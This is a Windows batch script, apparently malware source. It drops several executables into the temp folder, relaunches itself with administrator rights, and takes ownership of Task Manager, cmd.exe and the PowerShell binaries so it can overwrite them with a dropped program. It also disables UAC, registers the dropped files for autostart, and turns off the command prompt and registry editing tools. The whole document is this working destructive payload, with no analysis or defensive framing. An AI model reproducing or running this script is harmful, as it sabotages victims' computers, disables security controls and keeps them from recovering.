md %temp%\windows
copy "mesa.exe" "%temp%\windows"
copy "kill.exe" "%temp%\windows"
copy "cmds.exe" "%temp%\windows"
copy kill.exe %temp%
copy "mess\mess.exe" %temp%
copy "mess\mes.exe" %temp%
copy "cmds.exe" %temp%
whoami /priv | find "SeDebugPrivilege" > nul
if %errorlevel% neq 0 (
 @powershell start-process %~0 -verb runas
 exit
)
takeown /f C:\Windows\System32\taskmgr.exe & icacls C:\Windows\System32\taskmgr.exe /granted "%username%":F & copy mesa.exe "C:\Windows\System32\taskmgr.exe"

takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe & icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe /granted "%username%":F & copy %temp%\windows\mesa.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
takeown /f C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe & icacls C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe /granted "%username%":F & copy %temp%\windows\mesa.exe "C:\Windows\System32\WindowsPowerShell\v1.0\powershell_ise.exe"
takeown /f C:\Windows\system32\cmd.exe & icacls C:\Windows\system32\cmd.exe /granted "%username%":F & copy %temp%\windows\mesa.exe "C:\Windows\system32\cmd.exe"
takeown /f C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe & icacls C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe /granted "%username%":F & copy %temp%\windows\mesa.exe "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell_ise.exe"
takeown /f C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe & icacls C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe /granted "%username%":F & copy %temp%\windows\mesa.exe "C:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe"
takeown /f C:\Windows\system32\charmap.exe & icacls C:\Windows\system32\charmap.exe /granted "%username%":F & copy mesa.exe "C:\Windows\system32\charmap.exe"

reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /f

set a=%temp%\kill.exe
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "kill" /d  "%a%" /f

set a=%temp%\mess.exe
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "mess" /d  "%a%" /f

set a=%temp%\cmds.exe
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "cds" /d  "%a%" /f

reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\System" /v DisableCMD /t REG_DWORD /d 1 /f
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
